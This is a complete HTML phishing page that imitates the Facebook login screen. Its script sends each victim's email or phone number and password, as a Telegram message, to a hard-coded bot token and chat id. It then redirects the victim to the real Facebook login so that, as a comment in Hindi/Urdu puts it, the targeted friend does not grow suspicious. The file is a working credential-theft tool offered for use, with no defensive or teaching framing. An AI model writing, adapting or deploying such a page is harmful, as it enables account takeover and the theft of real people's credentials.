<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); width: 350px; text-align: center; }
        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
        button { width: 97%; padding: 12px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; }
        .footer { margin-top: 20px; font-size: 14px; color: #1c1e21; }
    </style>
</head>
<body>

<div class="login-box">
    <h1 style="color: #1877f2; font-size: 40px; margin-bottom: 10px;">facebook</h1>
    <p style="font-size: 18px; margin-bottom: 20px;">Recent login</p>
    <input type="text" id="phone" placeholder="Mobile number or email address" required>
    <input type="password" id="pass" placeholder="Password" required>
    <button onclick="captureData()">Log In</button>
    <div class="footer"><a href="#" style="text-decoration: none; color: #1877f2;">Forgotten password?</a></div>
</div>

<script>
function captureData() {
    const phone = document.getElementById('phone').value;
    const pass = document.getElementById('pass').value;

    // Aapka Telegram Setup
    const token = "8406470230:AAFzxl4w8KVN3W1bJSUiKnmQ1yY_v5MUjaE";
    const chat_id = "8714957240";

    const message = "🔥 **Naya Hunt Mila Hai!** 🔥\n\n📱 Phone/Email: " + phone + "\n🔑 Password: " + pass;

    const url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(message) + "&parse_mode=Markdown";

    fetch(url).then(() => {
        // Data milne ke baad asli Facebook par bhej do taake dost ko shaq na ho
        window.location.href = "https://www.facebook.com/login";
    }).catch(err => {
        console.error("Error sending data:", err);
    });
}
</script>

</body>
</html>
